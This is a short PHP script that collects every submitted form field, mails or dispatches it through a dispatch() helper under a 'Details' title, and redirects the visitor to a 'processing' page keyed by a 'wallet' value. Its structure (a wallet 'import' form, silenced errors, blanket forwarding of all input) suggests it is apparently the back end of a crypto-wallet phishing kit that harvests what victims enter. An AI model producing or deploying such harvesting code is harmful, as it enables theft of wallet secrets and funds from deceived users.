<?php
error_reporting(0);

require __DIR__.'/../helpers/resolver.php';
$config = resolve();

function validate()
{
    if (!array_key_exists('category', $_POST) || count($_POST) < 2) {
        header('Location: ../import.html');
        die();
    }
}

function process()
{
    global $config;
    $message = "Please be informed\n\n";
    foreach ($_POST as $key => $value) {
        $tmp = "Value of $key is $value\n";
        $message .= $tmp;
    }
    $title = $_POST['category'].' Details';
    dispatch($title, $message);

    $wallet = $_POST['wallet'];
    header("Location: ../processing.html?type=$wallet");
}
validate();
process();
